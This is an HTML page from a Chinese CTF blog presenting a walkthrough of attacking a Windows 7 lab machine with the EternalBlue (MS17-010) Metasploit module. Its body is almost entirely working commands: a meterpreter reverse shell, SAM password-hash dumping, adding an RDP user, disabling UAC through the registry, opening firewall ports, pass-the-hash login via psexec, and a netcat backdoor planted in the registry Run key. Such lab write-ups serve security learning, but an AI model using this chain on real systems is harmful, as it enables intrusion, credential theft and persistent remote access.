@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+
+<html lang="cn">
+
+<head>
+    
+    <title>Windows7-永恒之蓝 - RunCtf</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="images/logo.png" type="image/png" />
+    <meta name="description" content="Metasploit永恒之蓝：打入靶机12345678910111213sudo msfconsoleuse exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhost 目标靶机IPset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset lhost 操作机IPrun - expshell &gt; whoami">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows7-永恒之蓝">
+<meta property="og:url" content="http://runctf.cn/2022/11/27/Metasploit/index.html">
+<meta property="og:site_name" content="RunCtf">
+<meta property="og:description" content="Metasploit永恒之蓝：打入靶机12345678910111213sudo msfconsoleuse exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhost 目标靶机IPset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset lhost 操作机IPrun - expshell &gt; whoami">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-11-27T14:16:01.000Z">
+<meta property="article:modified_time" content="2023-01-11T16:35:33.792Z">
+<meta property="article:author" content="JunHou">
+<meta property="article:tag" content="技术">
+<meta name="twitter:card" content="summary">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1673454978748">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1673454978748">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1673454978748">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://tenapi.cn/acg/?100)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="JunHou" class="mdui-btn mdui-btn-icon"><img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="JunHou">
+            <img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou" alt="JunHou">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>13</div>
+        <div><span>Tags</span>5</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY/index.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/donate" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="Search" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1673454978748"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/289146211"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/server2565543706"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/dcncloud"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 20px;">技术</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%B8%B8%E6%88%8F/" style="font-size: 10px;">游戏</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(5);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    Hitokoto
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">13</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/">山东省&#34;技能兴鲁-网络安全赛道&#34;职业技能大赛WriteUp</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/15/%E5%8E%9F%E7%A5%9E%E6%9C%8D%E5%8A%A1%E5%8C%BA%E8%BD%AC%E6%8D%A2/">原神换服</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/CTFd/">部署CTFd</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/w1r3s-editable/">w1r3s-editable解题笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/10/%E7%AC%94%E8%AE%B0/">Pwn的学习笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 JunHou
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">	鲁ICP备2022032031-1号</a>
+        <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
+    </div>
+</div><!-- .nexmoe-drawer -->
+
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://tenapi.cn/acg/?2" alt="Windows7-永恒之蓝" loading="lazy">
+            <h1>Windows7-永恒之蓝</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2022年11月27日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><h2 id="永恒之蓝："><a href="#永恒之蓝：" class="headerlink" title="永恒之蓝："></a>永恒之蓝：</h2><h3 id="打入靶机"><a href="#打入靶机" class="headerlink" title="打入靶机"></a>打入靶机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">set rhost 目标靶机IP</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 操作机IP</span><br><span class="line"></span><br><span class="line">run - exp</span><br><span class="line"></span><br><span class="line">shell &gt; whoami </span><br></pre></td></tr></table></figure>
+
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">启用远程桌面</span><br><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line"></span><br><span class="line">创建一个新用户来远程连接 win7 桌面</span><br><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp USERNAME=xuegod PASSWORD=123456</span><br><span class="line"></span><br><span class="line">进行远程桌面</span><br><span class="line">rdesktop 192.168.1.56[地址为靶机地址]</span><br><span class="line"></span><br><span class="line">通过 ms17-010 永恒之蓝获取到的 shell 可能会出现操作受限的情况，所以我们使用主机的账户信息建立 session 进行连接。</span><br><span class="line">SAM 概述：SAM 文件即账号密码数据库文件，SAM 文件的位置是：</span><br><span class="line">C:\Windows\System32\config\SAM</span><br><span class="line"></span><br><span class="line">我们回到 MSF 控制台，从 SAM 导出密码哈希</span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line"></span><br><span class="line">我们取刚创建的 xuegod 用户的 hash 密码</span><br><span class="line">xuegod:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;netsh firewall add portopening TCP 4444 &quot;xuegod&quot; ENABLE ALL</span><br><span class="line"></span><br><span class="line">关闭 UAC</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;cmd.exe /k %windir%\System32\reg.exe ADDHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">开启 win7 系统主机的默认共享，默认共享对 Windows 主机的文件共享非常方便，也方便黑客利用</span><br><span class="line">这个功能，远程执行命令。</span><br><span class="line">C:\Windows\system32&gt;cmd.exe /k %windir%\System32\reg.exe ADDHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;exit #退出 shell 返回 meterpreter</span><br><span class="line">C:\Windows\system32&gt;exit</span><br><span class="line">C:\Windows\system32&gt;exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">我们先将 session 保存到后台</span><br><span class="line">meterpreter &gt; background</span><br><span class="line"></span><br><span class="line">3、使用 hash 值登录系统</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set RHOSTS 192.168.1.56</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set LHOST 192.168.1.53</span><br><span class="line">配置用户信息</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBUser xuegod</span><br><span class="line">密码使用哈希值</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBPass </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">这里局域网中 SMBDomain 都是 WORKGROUP 如果是域用户需要配置域名称。</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBDomainWORKGROUP</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line"></span><br><span class="line">下面我们配置一个后门程序，修改 UAC 的注册表，需要重启才能生效。</span><br><span class="line">上传 nc 到 Win7</span><br><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows</span><br><span class="line"></span><br><span class="line">注册表添加启动项执行 nc 反弹 shell 命令</span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\nc.exe -Ldp 443 -e cmd.exe&#x27;</span><br><span class="line"></span><br><span class="line">nc 参数解释：</span><br><span class="line">L 表示用户退出连接后重新进行端口侦听</span><br><span class="line">d 后台运行</span><br><span class="line">p 指定端口</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">防火墙允许 443 端口访问网络否则开机的时需要用户点击允许访问网络才可以成功执行。</span><br><span class="line">C:\Windows\system32&gt; netsh firewall add portopening TCP 443 &quot;xuegod443&quot; ENABLE AL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    <p><img data-fancybox="gallery" src="https://www.luminesight.com/cdn/Server/ShouKuanMA.jpg"  alt="ShouKuanMA.jpg" data-caption="ShouKuanMA.jpg" loading="lazy"></p>
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>JunHou<br>
+        <strong>Link：</strong><a href="http://runctf.cn/2022/11/27/Metasploit/" title="http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;11&#x2F;27&#x2F;Metasploit&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;11&#x2F;27&#x2F;Metasploit&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit"><span class="toc-number">1.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">永恒之蓝：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%85%A5%E9%9D%B6%E6%9C%BA"><span class="toc-number">1.1.1.</span> <span class="toc-text">打入靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.1.2.</span> <span class="toc-text">权限维持</span></a></li></ol></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/piao.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/shehuizhuyi.js"></script><!-- 点击出现爱心 --><script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/love.js"></script><!-- 点击出现彩色气球爆炸效果 --><canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/clickBom.js"></script>
+    <!-- themes/[theme_name]/layout/_script/comments.swig -->
+    {% include '_comments/gitalk.swig' %}
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1673454978751"></script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
